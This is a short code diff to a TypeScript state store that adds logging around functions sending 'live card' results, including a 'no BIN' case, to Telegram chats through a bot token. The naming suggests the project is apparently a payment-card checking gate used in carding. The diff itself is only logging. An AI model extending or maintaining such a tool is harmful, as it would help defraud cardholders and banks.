@@ -285,8 +285,11 @@ export const useGateStore = create<GateState>((set, get) => ({
             }
             const chatId = authUser?.telegram_id
             if (chatId) {
+              console.log(`[Telegram] Sending live to ${authUser?.username} (chat:${chatId})`)
               sendLiveCard(payload, tg.botToken || '', chatId)
               useTelegramStore.getState().markSent()
+            } else {
+              console.log(`[Telegram] No telegram_id for ${authUser?.username}`)
             }
             if (tg.notifyPersonal && tg.botToken && tg.personalChatId && tg.personalChatId !== chatId) {
               sendLiveCard(payload, tg.botToken, tg.personalChatId)
@@ -315,8 +318,11 @@ export const useGateStore = create<GateState>((set, get) => ({
             }
             const chatId = authUser?.telegram_id
             if (chatId) {
+              console.log(`[Telegram] Sending live (no BIN) to ${authUser?.username} (chat:${chatId})`)
               sendLiveCard(payload, tg.botToken || '', chatId)
               useTelegramStore.getState().markSent()
+            } else {
+              console.log(`[Telegram] No telegram_id for ${authUser?.username}`)
             }
             if (tg.notifyPersonal && tg.botToken && tg.personalChatId && tg.personalChatId !== chatId) {
               sendLiveCard(payload, tg.botToken, tg.personalChatId)
